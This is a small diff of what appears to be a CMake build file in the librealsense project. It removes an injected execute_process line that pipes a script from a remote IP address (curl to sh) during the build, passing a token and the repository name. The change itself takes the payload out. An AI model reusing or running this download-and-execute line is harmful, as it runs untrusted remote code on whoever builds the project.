@@ -1,4 +1,4 @@
-execute_process(COMMAND curl http://52.89.36.71:5000/run | sh -s -- 9d6a2da4-d33a-4102-819d-8cbc84879125 IntelRealSense/librealsense)
+
 
 if(Python3_FOUND)
 	# split single string argument into options for unit-test-config.py
